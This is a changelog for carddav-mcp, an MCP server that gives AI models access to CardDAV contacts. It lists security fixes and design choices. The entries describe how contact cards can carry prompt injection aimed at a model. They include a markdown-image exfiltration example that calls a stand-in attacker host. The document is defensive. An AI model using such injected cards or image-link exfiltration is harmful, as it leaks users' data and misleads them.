# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

<!-- The release workflow extracts the section of the version being tagged with
     awk, matching "## [x.y.z]". Keep that heading shape exactly. -->
<!-- The docs site includes everything between these markers. Keep the end
     marker last in the file so the link definitions come along. -->
<!-- #region changelog -->

## [0.1.1] - 2026-09-06

A security review of 0.1.0 — every module, the tests, the workflows and the
image — with the findings fixed rather than reported. Nothing here needed a
protocol change; every fix is behind the same seventeen tools.

### Security

- **Two quadratic regular expressions on text a card author or the server
  chooses.** `base64Bytes` measured a `PHOTO`'s padding with `/=*$/`, which is
  retried from every position of a run of `=` — 80 000 of them cost two
  seconds in `get_contact`, a card at the 1 MiB read ceiling cost minutes, and
  anyone with write access to a shared address book can store one. The same
  shape in `resourceNameOf` (`/[^/]*$/`) ran on every `<D:href>` of every
  listing, so one response with a long segment held the process for as long as
  the server liked. Both are `lastIndexOf` now, `normalisePath` and
  `resourceUrl` had the same pattern and are loops, and an href longer than
  8 KiB is dropped by the multistatus parser before anything walks it. A test
  file times each of them at its maximum size.
- **A prototype key in `PHOTO;TYPE=` crashed every listing the card was in.**
  `mediaTypeOf` looked the format up in an object literal, so `TYPE=constructor`
  returned `Object` itself where a string was promised, and the projection threw
  `input.normalize is not a function` out of `list_contacts`, `search_contacts`
  and `get_contact` — outside the guard that skips an unparseable card. The
  lookup uses `Object.hasOwn`, and a card that parses but cannot be shaped is
  now counted and skipped like one that does not parse.
- **Approval keys are bound to positions.** `setResourceKey` sorts its targets,
  which is right for a set and wrong for a tuple: `update_group` spelled the
  name and the note identically, so a token issued for `{name: "Team", note:
"internal"}` also executed `{name: "internal", note: "Team"}`, and
  `move_contact` listed source and destination together, so an approval to move
  a card from Work to Private also authorised moving a card of the same name
  from Private to Work. Every key is built with `orderedResourceKey`, which
  prefixes each part with its index.
- **`delete_contact` no longer deletes a group card**, `move_contact` no
  longer moves one, and a `raw_vcard` that is a group is refused by
  `create_contact` and `update_contact`. The first made `delete_group` a
  capability that `CARDDAV_DENY_TOOLS=delete_group` did not remove; the second
  left a group whose every member was unresolvable under a dialog that said
  "move a contact"; the third turned a contact into a group under "replace a
  contact card". All four refuse before anybody is asked.
- **`CARDDAV_ADDRESSBOOKS` entries are no longer quoted verbatim.** An entry
  that matched nothing was printed in full — to stderr, which is the MCP
  client's log, and into the `list_address_books` answer, which is the
  model's context — and an entry that matches nothing is exactly what a token
  pasted into the wrong line looks like. A path, a URL or a short segment name
  is quoted; anything else is described by its length. The startup warning
  about unencoded paths escapes the characters it fires on, and the
  `ELICITATION` and `CARDDAV_MAX_CONTACTS` diagnostics cut and escape what they
  were given.
- **`export_contacts` defuses its text channel.** Both channels carried the
  stored bytes, so a `NOTE` of `![…](https://attacker/x.png?d=…)` came back for
  a client to render and fetch. `structuredContent` is still the byte-exact
  export; the text block is a fenced, datamarked rendering with invisible
  characters removed and image markers broken, says so on its first line, and
  carries the injection warning.
- **Server-chosen strings in unmarked answers are cleaned.** `get_server_info`
  reported the principal and home hrefs raw beside the header tokens it had
  been careful about, and a path segment of `![leak](https://…)` survives
  `new URL()`; `list_changes`, `delete_contact` and `delete_group` reported the
  collection path raw in this server's own voice; the address book `url` was
  raw in `list_address_books`. All go through the short-text cleaner.
- **The fenced text block is measured against the result budget.** It was a
  third channel beside the two the budget measured, so a card just under the
  ceiling went out at roughly three times it. The budget can also drop from an
  array one level down now, so `get_group` on a large group is shortened
  rather than refused.
- **An upstream error body is quoted on one line, labelled and short**, with
  the DAV precondition element name capped — a server could put two thousand
  characters with line breaks into the one answer that carries no untrusted
  marker. The body is read _after_ the status is decided and under its own
  small ceiling, so a two-megabyte login page with a `401` reports the `401`
  and the credentials hint instead of "the answer was larger than … bytes".
- **A refused login is remembered for ten seconds.** Every request
  authenticates, and a model that reads "authentication refused" retries a
  tool annotated cheap and read-only; hosted providers lock an account after a
  handful of failed logins. The same refusal is repeated from memory inside the
  window, and says so.
- **A server ETag with a control character, or longer than a kilobyte, is
  treated like a weak one.** It went into `If-Match` unchecked, undici refused
  the header, and every write to that card failed as `fetch failed` for as
  long as the server kept sending it. The write path now refuses with its
  usual sentence about a missing guard.
- **A refused redirect is explained.** undici's `unexpected redirect` reached
  the model as `fetch failed`; the error now says the server redirected, that
  carddav-mcp does not follow one, and that `CARDDAV_URL` should name the
  address the server redirects to.
- **Discovery is bounded.** The registry keeps at most 256 address books and
  reports the overflow; a collection listed outside the home it was listed
  from is dropped, the way a card listed outside its collection already was.
- **`get_contact_photo` hands over nothing it cannot name.** Bytes that are not
  JPEG, PNG, GIF or WebP used to go out as an `image` block labelled
  `application/octet-stream`; they are refused with a sentence.
- **URL-shaped fields lose their userinfo.** `URL`, `IMPP`, a `PHOTO` stored as
  a link and a group's `MEMBER` reference can carry `user:password@`, and only
  `CARDDAV_URL` was redacted.
- **The publish job installs with `--ignore-scripts`.** It is the one job that
  holds an npm publishing token, and it ran every dependency's install hook
  while holding it; the audit job and the Dockerfile already installed this
  way. `actions/dependency-review-action` runs on pull requests, and the
  GitHub release is created with `--verify-tag`.
- **The runtime image drops yarn and the lockfile.** npm and corepack were
  already removed; yarn was not, and the lockfile is an inventory of the
  dependency tree that nothing in the image reads.
- `mcp-approval` 0.8.1: a sealed request state is single-use, so an answer to a
  confirmation dialog cannot be presented twice.

### Changed

- `sync_token` is validated on the way in with the same rule as on the way out
  (a URI, at most 512 characters), and `list_address_books` returns it
  verbatim or not at all — it used to clean it, which cut a long token with an
  ellipsis and broke the next sync against a server doing nothing wrong.
- `raw_vcard` refuses control characters other than line breaks, and a date
  has to exist: the 31st of February is refused, a yearless 29th is not.
- oxlint's `suspicious` category is on, `target` is ES2023 for `toSorted()`,
  and the coverage thresholds rose to 95 / 87 / 96 / 96.
- `docs/reference/tools.md` is written by hand again. It used to be generated
  from the registered tools, which kept it in step with the code at the price of
  a page nobody could edit: `--check` compared it byte for byte, so every line
  had to be derivable and a paragraph about how an endpoint really behaves had
  nowhere to go. A test now asserts what the generator guaranteed — the page
  documents exactly the tools that exist, marks exactly the `essential` preset,
  and marks exactly the tools that ask a person first — and leaves the prose to
  a person.
- `icon-512.png` is generated by `svg-asset-set` 0.3.0 from the favicon rather
  than rendered by hand, so `npm run assets:check` covers it and it cannot
  drift from the icon the docs site serves.

### Added

- A test asserting the server warns about untrusted content in `instructions`,
  the one channel a model reads before it calls anything.
- The Glama badge, now that the listing exists. Eleventh and last but one in
  the row, which is the full set.

### Fixed

- `hintFor` explains a `valid-sync-token` refusal: drop the token and start
  over without one.
- `get_group` reports how many cards in the book share a UID and resolves the
  first the server listed, instead of silently re-pointing a member at the
  last.
- The sanitisers cut their input before defusing image markers, which
  expanded two characters into thirty-one over the whole input first.
- `writeAddress` folds line breaks like every other serialiser, and the four
  reads that bypassed `propertyValue` go through it.
- The error message that refuses a group where a contact was meant no longer
  names a tool the `essential` preset does not register.
- The fake CardDAV server in the unit suite records request headers, refuses
  a PUT or DELETE without a guard, and can issue weak or malformed ETags,
  answer 412, and fail a scripted request — so the write guards are proven on
  the wire rather than assumed.
- Two overlapping labels in the architecture diagram. `PROPFIND · REPORT · PUT`
  was about 150px on one line in a 100px gap, so it was drawn across the right
  edge of the carddav-mcp box and into the CardDAV box, on top of the text
  already there; the three verbs are stacked now. `Radicale, Baikal, Nextcloud,
…` overflowed both edges of its own box and is on two lines.

## [0.1.0] - 2026-09-06

### Added

First release. An MCP server for CardDAV: 17 tools over contacts, groups and
photos, on any server that speaks the standard.

- **17 tools**, 10 read and 7 write. `CARDDAV_READ_ONLY=true` leaves the write
  tools unregistered rather than failing them, so they do not appear in
  `tools/list` at all.
- **A listing is cheap and says so.** `list_contacts` retrieves only the
  summary properties, which is the difference between a few kilobytes and
  several megabytes once inline photos are involved — and every entry it
  returns is marked `partial`, because a card retrieved that way is missing
  everything not asked for. The write path never accepts one: it issues its own
  `GET` for the card it is about to replace, every time.
- **Writes are read-modify-write over the parsed card**, never a document
  rebuilt from the fields this server models. An `X-` property some phone wrote
  in 2014, a photo nobody mentioned and every parameter survive an edit because
  they are never touched. Guarded with `If-Match` from the same read; never
  `If-Match: *`; a weak ETag is refused rather than dropped.
- **Both group conventions.** vCard 4's `KIND:group` with `MEMBER`, and Apple's
  `X-ADDRESSBOOKSERVER-KIND` on top of vCard 3 — which is what Apple Contacts,
  Nextcloud and most of the installed base actually store. Both are read; the
  one written follows whatever the address book already uses, because a group
  in the other convention is invisible in the client the person is looking at.
- **A search is one request, not one per field.** RFC 6352 gives `<C:filter>` a
  `test` attribute defaulting to `anyof`, so several properties are matched in
  a single `addressbook-query`. Whatever comes back is checked again locally,
  because a server that filters only partially is indistinguishable from one
  that matched properly, and the result says which path it took.
- **Birthdays keep the year they have, and no more.** `BDAY:--0415` means "15
  April, year unknown", which is what a phone writes when the year was never
  entered and a large share of real birthdays look like. It is reported as
  `{month, day}` rather than mapped to nothing or given an invented year.
- **`CARDDAV_ADDRESSBOOKS` fences the server to named address books**, enforced
  where an id is decoded rather than at the edge of each tool, so no tool can
  forget it — including a group membership change, which is the one place a
  fenced-off path could otherwise be named. A listing reports how many
  collections it withheld instead of quietly being shorter.
- **Ids are opaque and carry no origin.** The host is rebuilt from
  `CARDDAV_URL` on every decode, so a forged id cannot point this server at
  another server. Every join of a collection URL and a card name is checked on
  the **resolved** path: checking the name for a literal `/` is not the same
  check, because the URL parser normalises `%2E%2E` and treats a backslash as a
  separator.
- **Contacts are treated as text a stranger wrote**, because an address book
  rarely is written only by its owner — cards arrive by import from a phone, by
  sync from a directory, and from anyone with write access to a shared book.
  Names, organisations and notes are fenced with a per-call nonce and marked
  line by line; invisible and directional characters are removed; markdown
  image syntax is defused. Two of the injection shapes reported are specific to
  an address book, and the second is the reason contacts are worth attacking at
  all: a card asserting that somebody's number or account has changed does not
  need the model to run a tool, only to be believed.
- **Nothing this server says quotes card content.** Not the approval dialogs,
  not the error messages. Every value an error repeats is escaped, collapsed to
  one line and cut first, because an error reaches the model in the server's
  own voice, outside any fence.
- **Photos are reported, not delivered.** `get_contact` says a photo is there,
  its type and its size; `get_contact_photo` returns the bytes as an image when
  asked for by name. A photo stored as a URI is reported and never fetched —
  that address was chosen by whoever wrote the card.
- **It never fetches an address somebody else chose.** No tool takes a URL.
  Links returned by the server are pinned to the configured origin and refused
  if they carry credentials or a scheme this server does not speak — checked
  again at the point the credentials would leave the process.
- **`CARDDAV_ALLOW_PLAINTEXT`.** A plain `http://` URL to a host that is not
  loopback refuses to start instead of printing a warning that a stdio
  deployment never shows. The switch lifts the refusal and is read strictly,
  like `CARDDAV_INSECURE_TLS`.
- Bearer or Basic authentication, RFC 6764 discovery from a server root or a
  collection URL, RFC 6578 `sync-collection` as `list_changes`, and a raw vCard
  export that keeps the properties this server does not model — because an
  export that dropped them would be a backup that silently loses data.

[0.1.1]: https://github.com/ni-c/carddav-mcp/releases/tag/v0.1.1
[0.1.0]: https://github.com/ni-c/carddav-mcp/releases/tag/v0.1.0

<!-- #endregion changelog -->
